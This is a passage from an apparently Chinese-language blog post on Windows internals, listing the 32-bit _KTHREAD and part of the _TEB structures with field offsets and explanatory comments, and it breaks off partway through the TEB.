class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">KTHREAD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">DISPATCHER_HEADER</span> <span class="title">Header</span>;</span>             <span class="comment">// 0x00: 调度器头，支持线程同步、定时器等</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONGLONG CycleTime;                 <span class="comment">// 0x10: 累计使用的 CPU 时间（时间戳计数）</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONG HighCycleTime;                 <span class="comment">// 0x18: CycleTime 的高 32 位</span></span><br><span class="line">    ULONGLONG QuantumTarget;                      <span class="comment">// 0x20: 时间片截止时间</span></span><br><span class="line">    VOID* InitialStack;                           <span class="comment">// 0x28: 📌栈底指针</span></span><br><span class="line">    VOID* <span class="keyword">volatile</span> StackLimit;                    <span class="comment">// 0x2C: 📌栈顶界限（溢出保护）</span></span><br><span class="line">    VOID* KernelStack;                            <span class="comment">// 0x30: 📌当前内核栈指针，用户线程切换的时候保存 ESP</span></span><br><span class="line">    ULONG ThreadLock;                             <span class="comment">// 0x34: 自旋锁，用于线程结构保护</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">KWAIT_STATUS_REGISTER</span> <span class="title">WaitRegister</span>;</span>    <span class="comment">// 0x38: 等待状态寄存器（压缩状态位）</span></span><br><span class="line">    <span class="keyword">volatile</span> UCHAR Running;                       <span class="comment">// 0x39: 📌当前是否正在运行（1 表示运行）</span></span><br><span class="line">    UCHAR Alerted[<span class="number">2</span>];                             <span class="comment">// 0x3A: 📌[0]=内核APC警报, [1]=用户APC警报</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG KernelStackResident:<span class="number">1</span>;          <span class="comment">// bit  0: 栈是否驻留在内存中</span></span><br><span class="line">            ULONG ReadyTransition:<span class="number">1</span>;              <span class="comment">// bit  1: 准备态转运行态</span></span><br><span class="line">            ULONG ProcessReadyQueue:<span class="number">1</span>;            <span class="comment">// bit  2: 线程是否在进程就绪队列中</span></span><br><span class="line">            ULONG WaitNext:<span class="number">1</span>;                     <span class="comment">// bit  3: 是否立即等待下一个事件</span></span><br><span class="line">            ULONG SystemAffinityActive:<span class="number">1</span>;         <span class="comment">// bit  4: 是否强制使用系统亲和性</span></span><br><span class="line">            ULONG Alertable:<span class="number">1</span>;                    <span class="comment">// bit  5: 📌是否可以中断（用于 APC）</span></span><br><span class="line">            ULONG GdiFlushActive:<span class="number">1</span>;               <span class="comment">// bit  6: 是否在刷新 GDI 缓存</span></span><br><span class="line">            ULONG UserStackWalkActive:<span class="number">1</span>;          <span class="comment">// bit  7: 是否正在遍历用户栈</span></span><br><span class="line">            ULONG ApcInterruptRequest:<span class="number">1</span>;          <span class="comment">// bit  8: 📌是否请求 APC 中断</span></span><br><span class="line">            ULONG ForceDeferSchedule:<span class="number">1</span>;           <span class="comment">// bit  9: 是否强制延迟调度</span></span><br><span class="line">            ULONG QuantumEndMigrate:<span class="number">1</span>;            <span class="comment">// bit 10: 是否允许量子结束时迁移</span></span><br><span class="line">            ULONG UmsDirectedSwitchEnable:<span class="number">1</span>;      <span class="comment">// bit 11: 是否启用 UMS 指定切换</span></span><br><span class="line">            ULONG TimerActive:<span class="number">1</span>;                  <span class="comment">// bit 12: 线程是否激活了计时器</span></span><br><span class="line">            ULONG SystemThread:<span class="number">1</span>;                 <span class="comment">// bit 13: 是否为系统线程（非用户）</span></span><br><span class="line">            ULONG Reserved:<span class="number">18</span>;                    <span class="comment">// bit 14-31: 保留位</span></span><br><span class="line">        &#125;;</span><br><span class="line">        LONG MiscFlags;                           <span class="comment">// 0x3C: 以上所有位的组合访问</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">KAPC_STATE</span> <span class="title">ApcState</span>;</span>              <span class="comment">// 0x40: 📌APC 状态，含队列与锁</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR ApcStateFill[<span class="number">23</span>];               <span class="comment">// 填充</span></span><br><span class="line">            CHAR Priority;                        <span class="comment">// 0x57: 当前线程调度优先级</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">volatile</span> ULONG NextProcessor;                <span class="comment">// 0x58: 调度目标 CPU</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONG DeferredProcessor;            <span class="comment">// 0x5C: 被延迟分配的 CPU</span></span><br><span class="line">    ULONG ApcQueueLock;                          <span class="comment">// 0x60: APC 队列互斥锁</span></span><br><span class="line">    ULONG ContextSwitches;                       <span class="comment">// 0x64: 上下文切换计数器</span></span><br><span class="line">    <span class="keyword">volatile</span> UCHAR State;                        <span class="comment">// 0x68: 线程状态（Initialized 等）</span></span><br><span class="line">    CHAR NpxState;                               <span class="comment">// 0x69: 协处理器状态</span></span><br><span class="line">    UCHAR WaitIrql;                              <span class="comment">// 0x6A: 等待时提升的 IRQL</span></span><br><span class="line">    CHAR WaitMode;                               <span class="comment">// 0x6B: 等待模式（内核 / 用户）</span></span><br><span class="line">    <span class="keyword">volatile</span> LONG WaitStatus;                    <span class="comment">// 0x6C: 等待完成状态</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KWAIT_BLOCK</span>* <span class="title">WaitBlockList</span>;</span>          <span class="comment">// 0x70: 等待块链表指针</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">WaitListEntry</span>;</span>        <span class="comment">// 0x74: 等待对象链表节点</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">SINGLE_LIST_ENTRY</span> <span class="title">SwapListEntry</span>;</span> <span class="comment">// 0x74: 用于交换线程的备用单链</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KQUEUE</span>* <span class="title">volatile</span> <span class="title">Queue</span>;</span>              <span class="comment">// 0x7C: 所在等待队列</span></span><br><span class="line">    ULONG WaitTime;                              <span class="comment">// 0x80: 等待开始时间</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            SHORT KernelApcDisable;              <span class="comment">// 0x84: 禁止内核 APC</span></span><br><span class="line">            SHORT SpecialApcDisable;             <span class="comment">// 0x86: 禁止特殊 APC（如调度）</span></span><br><span class="line">        &#125;;</span><br><span class="line">        ULONG CombinedApcDisable;                <span class="comment">// 0x84: 合并后的 APC 禁止位</span></span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* Teb;                                   <span class="comment">// 0x88: 📌用户线程环境块 TEB 指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTIMER</span> <span class="title">Timer</span>;</span>                        <span class="comment">// 0x90: 内核定时器对象</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG AutoAlignment:<span class="number">1</span>;               <span class="comment">// bit  0: 栈自动对齐</span></span><br><span class="line">            ULONG DisableBoost:<span class="number">1</span>;                <span class="comment">// bit  1: 禁用优先级提升</span></span><br><span class="line">            ULONG EtwStackTraceApc1Inserted:<span class="number">1</span>;   <span class="comment">// bit  2: ETW APC1 插入标志</span></span><br><span class="line">            ULONG EtwStackTraceApc2Inserted:<span class="number">1</span>;   <span class="comment">// bit  3: ETW APC2 插入标志</span></span><br><span class="line">            ULONG CalloutActive:<span class="number">1</span>;               <span class="comment">// bit  4: 回调活动中</span></span><br><span class="line">            ULONG ApcQueueable:<span class="number">1</span>;                <span class="comment">// bit  5: 是否允许 APC 入队</span></span><br><span class="line">            ULONG EnableStackSwap:<span class="number">1</span>;             <span class="comment">// bit  6: 启用栈切换</span></span><br><span class="line">            ULONG GuiThread:<span class="number">1</span>;                   <span class="comment">// bit  7: 是否 GUI 线程</span></span><br><span class="line">            ULONG UmsPerformingSyscall:<span class="number">1</span>;        <span class="comment">// bit  8: UMS 正在执行系统调用</span></span><br><span class="line">            ULONG VdmSafe:<span class="number">1</span>;                     <span class="comment">// bit  9: VDM 兼容（16 位支持）</span></span><br><span class="line">            ULONG UmsDispatched:<span class="number">1</span>;               <span class="comment">// bit 10: 已分派为 UMS 线程</span></span><br><span class="line">            ULONG ReservedFlags:<span class="number">21</span>;              <span class="comment">// bit 11-31: 保留</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">volatile</span> LONG ThreadFlags;               <span class="comment">// 0xB8: 所有标志位联合体访问</span></span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* ServiceTable;                          <span class="comment">// 0xBC: 系统调用服务表（指向 SSDT）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KWAIT_BLOCK</span> <span class="title">WaitBlock</span>[4];</span>           <span class="comment">// 0xC0: 最多支持同时等待 4 个同步对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">QueueListEntry</span>;</span>          <span class="comment">// 0x120: 在线程队列（如工作队列）中的节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTRAP_FRAME</span>* <span class="title">TrapFrame</span>;</span>             <span class="comment">// 0x128: 当前陷阱帧指针（中断或异常时的栈帧）</span></span><br><span class="line">    VOID* FirstArgument;                        <span class="comment">// 0x12C: 初始参数（如新线程的入口参数）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        VOID* CallbackStack;                    <span class="comment">// 0x130: 当前正在执行的回调栈地址</span></span><br><span class="line">        ULONG CallbackDepth;                    <span class="comment">// 0x130: 回调嵌套深度</span></span><br><span class="line">    &#125;;</span><br><span class="line">    UCHAR ApcStateIndex;                        <span class="comment">// 0x134: 📌APC 状态索引（内核/用户）</span></span><br><span class="line">    CHAR BasePriority;                          <span class="comment">// 0x135: 初始基本优先级</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        CHAR PriorityDecrement;                 <span class="comment">// 0x136: 当前优先级减少值（优先级衰减）</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR ForegroundBoost : <span class="number">4</span>;          <span class="comment">// bit 0-3: 前台线程优先级提升</span></span><br><span class="line">            UCHAR UnusualBoost   : <span class="number">4</span>;           <span class="comment">// bit 4-7: 特殊调度场景提升</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    UCHAR Preempted;                            <span class="comment">// 0x137: 是否被抢占</span></span><br><span class="line">    UCHAR AdjustReason;                         <span class="comment">// 0x138: 优先级调整原因</span></span><br><span class="line">    CHAR AdjustIncrement;                       <span class="comment">// 0x139: 优先级调整增量</span></span><br><span class="line">    CHAR PreviousMode;                          <span class="comment">// 0x13A: 上下文切换前的 CPU 模式（用户/内核）</span></span><br><span class="line">    CHAR Saturation;                            <span class="comment">// 0x13B: 饱和度指标，用于调度策略</span></span><br><span class="line">    ULONG SystemCallNumber;                     <span class="comment">// 0x13C: 上次系统调用号</span></span><br><span class="line">    ULONG FreezeCount;                          <span class="comment">// 0x140: 冻结计数（例如调试器挂起）</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GROUP_AFFINITY</span> <span class="title">UserAffinity</span>;</span> <span class="comment">// 0x144: 用户设置的 CPU 亲和性</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KPROCESS</span>* <span class="title">Process</span>;</span>                  <span class="comment">// 0x150: 📌所属进程的 `_KPROCESS` 指针</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GROUP_AFFINITY</span> <span class="title">Affinity</span>;</span>   <span class="comment">// 0x154: 当前线程亲和性掩码（活动 CPU 集）</span></span><br><span class="line">    ULONG IdealProcessor;                       <span class="comment">// 0x160: 调度器理想的运行 CPU</span></span><br><span class="line">    ULONG UserIdealProcessor;                   <span class="comment">// 0x164: 用户设置的理想处理器编号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KAPC_STATE</span>* <span class="title">ApcStatePointer</span>[2];</span>     <span class="comment">// 0x168: 指向内核 / 用户 APC 状态</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">KAPC_STATE</span> <span class="title">SavedApcState</span>;</span>       <span class="comment">// 0x170: 保存的 APC 状态（线程挂起/恢复时）</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR SavedApcStateFill[<span class="number">23</span>];        <span class="comment">// 填充对齐</span></span><br><span class="line">            UCHAR WaitReason;                   <span class="comment">// 0x187: 当前线程的等待原因（调试、同步等）</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    CHAR SuspendCount;                          <span class="comment">// 0x188: 被挂起次数（非 0 时线程暂停）</span></span><br><span class="line">    CHAR Spare1;                                <span class="comment">// 0x189: 保留</span></span><br><span class="line">    UCHAR OtherPlatformFill;                    <span class="comment">// 0x18A: 多平台兼容保留位</span></span><br><span class="line">    VOID* <span class="keyword">volatile</span> Win32Thread;                 <span class="comment">// 0x18C: 指向 Win32 子系统线程结构（如 CSR）</span></span><br><span class="line">    VOID* StackBase;                            <span class="comment">// 0x190: 栈基地址（高地址）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">KAPC</span> <span class="title">SuspendApc</span>;</span>                <span class="comment">// 0x194: 用于挂起线程的 APC 对象</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR SuspendApcFill0[<span class="number">1</span>];           <span class="comment">// 0x194</span></span><br><span class="line">            UCHAR ResourceIndex;                <span class="comment">// 0x195: 分配资源索引</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR SuspendApcFill1[<span class="number">3</span>];           <span class="comment">// 0x194</span></span><br><span class="line">            UCHAR QuantumReset;                 <span class="comment">// 0x197: 时间片重置标志</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR SuspendApcFill2[<span class="number">4</span>];           <span class="comment">// 0x194</span></span><br><span class="line">            ULONG KernelTime;                   <span class="comment">// 0x198: 已消耗的内核时间</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR SuspendApcFill3[<span class="number">36</span>];          <span class="comment">// 0x194</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">KPRCB</span>* <span class="title">volatile</span> <span class="title">WaitPrcb</span>;</span>   <span class="comment">// 0x1B8: 当前等待的 PRCB（处理器控制块）</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR SuspendApcFill4[<span class="number">40</span>];          <span class="comment">// 0x194</span></span><br><span class="line">            VOID* LegoData;                     <span class="comment">// 0x1BC: LEGO 用户模式调度器数据</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR SuspendApcFill5[<span class="number">47</span>];          <span class="comment">// 0x194</span></span><br><span class="line">            UCHAR LargeStack;                   <span class="comment">// 0x1C3: 是否使用大栈（&gt;默认大小）</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG UserTime;                             <span class="comment">// 0x1C4: 已消耗的用户模式时间</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">KSEMAPHORE</span> <span class="title">SuspendSemaphore</span>;</span>    <span class="comment">// 0x1C8: 挂起信号量（用于线程恢复）</span></span><br><span class="line">        UCHAR SuspendSemaphorefill[<span class="number">20</span>];         <span class="comment">// 填充用</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG SListFaultCount;                      <span class="comment">// 0x1DC: SList 异常计数（栈溢出等）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ThreadListEntry</span>;</span>         <span class="comment">// 0x1E0: 📌线程链表节点（进程中的线程列表）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">MutantListHead</span>;</span>          <span class="comment">// 0x1E8: 线程持有的互斥体链表头</span></span><br><span class="line">    VOID* SListFaultAddress;                    <span class="comment">// 0x1F0: 最后一个异常 SList 操作地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTHREAD_COUNTERS</span>* <span class="title">ThreadCounters</span>;</span>   <span class="comment">// 0x1F4: 性能统计计数器</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">XSTATE_SAVE</span>* <span class="title">XStateSave</span>;</span>            <span class="comment">// 0x1F8: 扩展浮点 / AVX 状态保存结构</span></span><br><span class="line">&#125;; <span class="comment">// 0x200 bytes</span></span><br></pre></td></tr></table></figure><h4 id="TEB-Thread-Environment-Block"><a href="#TEB-Thread-Environment-Block" class="headerlink" title="TEB (Thread Environment Block):"></a>TEB (Thread Environment Block):</h4><p>位于用户模式，存储线程局部数据。</p><ul><li>关键成员:<code>NtTib</code> (栈范围), <code>TlsSlots</code> (线程本地存储 TLS)。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">TEB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> <span class="title">NtTib</span>;</span>                                                   <span class="comment">// 0x0  存储线程信息块（TIB），包括堆栈指针、异常处理信息等。</span></span><br><span class="line">    VOID* EnvironmentPointer;                                               <span class="comment">// 0x1c 指向当前线程环境块的指针，通常包含与线程环境相关的信息。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span> <span class="title">ClientId</span>;</span>                                             <span class="comment">// 0x20 存储线程的客户端ID（包含进程ID和线程ID）。</span></span><br><span class="line">    VOID* ActiveRpcHandle;                                                  <span class="comment">// 0x28 当前活动的 RPC 句柄，用于跟踪线程参与的 RPC 调用。</span></span><br><span class="line">    VOID* ThreadLocalStoragePointer;                                        <span class="comment">// 0x2c 指向线程本地存储（TLS）区域的指针。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span>* <span class="title">ProcessEnvironmentBlock</span>;</span>                                   <span class="comment">// 0x30 指向进程环境块（PEB）的指针，包含进程的全局信息。</span></span><br><span class="line">    ULONG LastErrorValue;                                                   <span class="comment">// 0x34 线程的最后错误值，用于记录线程的错误状态。</span></span><br><span class="line">    ULONG CountOfOwnedCriticalSections;                                     <span class="comment">// 0x38 线程拥有的临界区数量，表示该线程管理的临界区的数量。</span></span><br><span class="line">    VOID* CsrClientThread;                                                  <span class="comment">// 0x3c 指向客户端线程信息的指针。</span></span><br><span class="line">    VOID* Win32ThreadInfo;                                                  <span class="comment">// 0x40 指向 Windows 32 位线程信息的指针，通常用于存储 Windows 特定的线程信息。</span></span><br><span class="line">    ULONG User32Reserved[<span class="number">26</span>];                                               <span class="comment">// 0x44 保留字段，供用户使用的 32 位操作系统相关数据。</span></span><br><span class="line">    ULONG UserReserved[<span class="number">5</span>];                                                  <span class="comment">// 0xac 额外的用户保留数据。</span></span><br><span class="line">    VOID* WOW32Reserved;                                                    <span class="comment">// 0xc0 32 位应用程序的相关数据，供 WOW（Windows on Windows）支持使用。</span></span><br><span class="line">    ULONG CurrentLocale;                                                    <span class="comment">// 0xc4 当前线程的区域设置标识符。</span></span><br><span class="line">    ULONG FpSoftwareStatusRegister;                                         <span class="comment">// 0xc8 用于存储浮点运算软件状态寄存器的值。</span></span><br><span class="line">    VOID* SystemReserved1[<span class="number">54</span>];                                              <span class="comment">// 0xcc 保留字段，供系统内部使用。</span></span><br><span class="line">    LONG ExceptionCode;                                                     <span class="comment">// 0x1a4 存储与当前线程异常相关的代码。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_STACK</span>* <span class="title">ActivationContextStackPointer</span>;</span>        <span class="comment">// 0x1a8 指向激活上下文堆栈的指针，通常用于存储与应用程序活动相关的上下文信息。</span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">36</span>];                                                   <span class="comment">// 0x1ac 保留字节，供未来使用。</span></span><br><span class="line">    ULONG TxFsContext;                                                      <span class="comment">// 0x1d0 用于跟踪事务文件系统（TxFs）上下文的字段。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">GDI_TEB_BATCH</span> <span class="title">GdiTebBatch</span>;</span>                                      <span class="comment">// 0x1d4 与 GDI（图形设备接口）相关的线程批处理信息。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span> <span class="title">RealClientId</span>;</span>                                         <span class="comment">// 0x6b4 线程的实际客户端ID，包含进程ID和线程ID。</span></span><br><span class="line">    VOID* GdiCachedProcessHandle;                                           <span class="comment">// 0x6bc 存储 GDI 缓存的进程句柄。</span></span><br><span class="line">    ULONG GdiClientPID;                                                     <span class="comment">// 0x6c0 GDI 客户端进程ID。</span></span><br><span class="line">    ULONG GdiClientTID;                                                     <span class="comment">// 0x6c4 GDI 客户端线程ID。</span></span><br><span class="line">    VOID* GdiThreadLocalInfo;                                               <span class="comment">// 0x6c8 存储 GDI 线程本地信息的指针。</span></span><br><span class="line">    ULONG Win32ClientInfo[<span class="number">62</span>];                                              <span class="comment">// 0x6cc 存储 Windows 32 位客户端信息的数组。</span></span><br><span class="line">    VOID* glDispatchTable[<span class="number">233</span>];                                             <span class="comment">// 0x7c4 OpenGL 调度表，包含图形渲染相关的函数指针。</span></span><br><span class="line">    ULONG glReserved1[<span class="number">29</span>];                                                  <span class="comment">// 0xb68 OpenGL 保留字段。</span></span><br><span class="line">    VOID* glReserved2;                                                      <span class="comment">// 0xbdc 额外的 OpenGL 保留字段。</span></span><br><span class="line">    VOID* glSectionInfo;                                                    <span class="comment">// 0xbe0 OpenGL 部分信息。</span></span><br><span class="line">    VOID* glSection;                                                        <span class="comment">// 0xbe4 OpenGL 部分数据。</span></span><br><span class="line">    VOID* glTable;                                                          <span class="comment">// 0xbe8 OpenGL 表格数据。</span></span><br><span class="line">    VOID* glCurrentRC;                                                      <span class="comment">// 0xbec 当前渲染上下文。</span></span><br><span class="line">    VOID* glContext;                                                        <span class="comment">// 0xbf0 OpenGL 上下文。</span></span><br><span class="line">    ULONG LastStatusValue;                                                  <span class="comment">// 0xbf4 记录线程的最后状态值。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">StaticUnicodeString</span>;</span>                             <span class="comment">// 0xbf8 静态 Unicode 字符串，用于存储静态字符串数据。</span></span><br><span class="line">    WCHAR StaticUnicodeBuffer[<span class="number">261</span>];                                         <span class="comment">// 0xc00 静态 Unicode 字符串缓冲区。</span></span><br><span class="line">    VOID* DeallocationStack;                                                <span class="comment">// 0xe0c 用于存储内存回收的堆栈指针。</span></span><br><span class="line">    VOID* TlsSlots[<span class="number">64</span>];                                                     <span class="comment">// 0xe10 线程本地存储（TLS）槽数组，用于存储每个槽中的 TLS 数据。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">TlsLinks</span>;</span>                                            <span class="comment">// 0xf10 与 TLS 相关的链表。</span></span><br><span class="line">    VOID* Vdm;                                                              <span class="comment">// 0xf18 VDM（虚拟 DOS 模式）相关数据。</span></span><br><span class="line">    VOID* ReservedForNtRpc;                                                 <span class="comment">// 0xf1c 保留给 NT RPC 的数据。</span></span><br><span class="line">    VOID* DbgSsReserved[<span class="number">2</span>];                                                 <span class="comment">// 0xf20 用于调试 SS（子系统）相关的保留数据。</span></span><br><span class="line">    ULONG HardErrorMode;                                                    <span class="comment">// 0xf28 用于线程处理硬错误模式的状态。</span></span><br><span class="line">    VOID* Instrumentation[<span class="number">9</span>];                                               <span class="comment">// 0xf2c 用于线程的性能监控和调试数据的数组。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">GUID</span> <span class="title">ActivityId</span>;</span>                                                <span class="comment">// 0xf50 当前线程的活动标识符（GUID）。</span></span><br><span class="line">    VOID* SubProcessTag;                                                    <span class="comment">// 0xf60 子进程标记。</span></span><br><span class="line">    VOID* EtwLocalData;                                                     <span class="comment">// 0xf64 本地 ETW（事件跟踪）数据。</span></span><br><span class="line">    VOID* EtwTraceData;                                                     <span class="comment">// 0xf68 ETW 追踪数据。</span></span><br><span class="line">    VOID* WinSockData;                                                      <span class="comment">// 0xf6c 与 Windows Sockets（WinSock）相关的数据。</span></span><br><span class="line">    ULONG GdiBatchCount;                                                    <span class="comment">// 0xf70 GDI 批量计数。</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESSOR_NUMBER</span> <span class="title">CurrentIdealProcessor</span>;</span>                     <span class="comment">// 0xf74 当前理想处理器的编号。</span></span><br><span class="line">        ULONG IdealProcessorValue;                                          <span class="comment">// 0xf74 理想处理器的数值表示。</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        